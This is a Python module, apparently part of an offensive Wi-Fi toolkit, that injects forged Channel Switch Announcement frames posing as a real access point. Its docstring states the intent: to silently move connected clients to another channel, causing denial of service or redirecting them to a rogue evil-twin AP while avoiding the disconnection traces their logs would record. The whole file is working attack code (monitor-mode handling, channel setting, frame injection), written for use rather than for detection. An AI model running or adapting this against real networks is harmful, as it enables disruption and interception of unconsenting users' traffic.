"""Channel Switch Announcement (CSA) spoofing.

Sends forged Channel Switch Announcement Action frames (frames.py's
craft_csa_action) as if from the real AP, telling its clients to retune to
a channel of our choosing. Unlike deauth, a client that honors this never
disassociates -- it just silently follows the "AP" to the new channel,
where it finds nothing (denial of service) or, paired with a rogue AP
already broadcasting there, us (redirection toward an evil twin without
ever triggering a disassociation/reconnection the client's own logs would
flag). Native from-scratch injection, following attacks/deauth.py's
conventions (monitor-mode self-heal, per-frame stop_event check, one
socket.send() per frame).
"""

from __future__ import annotations

import time

from scapy.config import conf

from ..frames import BROADCAST, craft_csa_action
from ..radio import ensure_channel, ensure_monitor_mode, get_mode


def send_csa(
    iface: str,
    bssid: str,
    new_channel: int,
    client: str = BROADCAST,
    count: int = 10,
    channel: int | None = None,
    interval: float = 0.1,
    progress_fn=None,
    stop_event=None,
) -> int:
    """Send count CSA Action frames from bssid telling client to switch to
    new_channel.

    channel: the REAL AP's current channel to park our own radio on before
    transmitting -- our frames must go out where the target is actually
    listening. new_channel (the channel we're telling clients to jump TO)
    is a separate, unrelated value.

    stop_event: checked before every frame; a set event aborts the
    remaining count immediately, same contract as attacks/deauth.py.

    Returns the number of frames actually handed to the OS for
    transmission (see deauth()'s own docstring for why this is the
    honest thing to report, not proof of over-the-air reception) -- 0 if
    iface isn't in monitor mode.
    """
    log = progress_fn or (lambda msg: None)

    mode = get_mode(iface)
    if mode != "monitor":
        ensure_monitor_mode(iface)
        mode = get_mode(iface)
        if mode == "monitor":
            log(f"{iface} had dropped out of monitor mode -- restored")

    if ensure_channel(iface, channel):
        log(f"channel set to {channel}")

    if mode != "monitor":
        log(f"WARNING: {iface} is in '{mode}' mode, not monitor -- CSA frames cannot transmit")
        return 0

    pkt = craft_csa_action(bssid=bssid, client=client, new_channel=new_channel)
    try:
        sock = conf.L2socket(iface=iface)
    except OSError as exc:
        log(f"CSA socket open failed: {exc}")
        return 0

    sent = 0
    try:
        for i in range(count):
            if stop_event is not None and stop_event.is_set():
                log(f"CSA spoof stopped after {sent} frame(s) -- stop requested")
                return sent
            try:
                sock.send(pkt)
                sent += 1
            except OSError as exc:
                log(f"CSA send failed after {sent} frame(s): {exc}")
                return sent
            log(f"CSA frame {i + 1}/{count} sent: {bssid} -> {client}, switch to channel {new_channel}")
            if interval and i < count - 1:
                time.sleep(interval)
    finally:
        sock.close()
    return sent
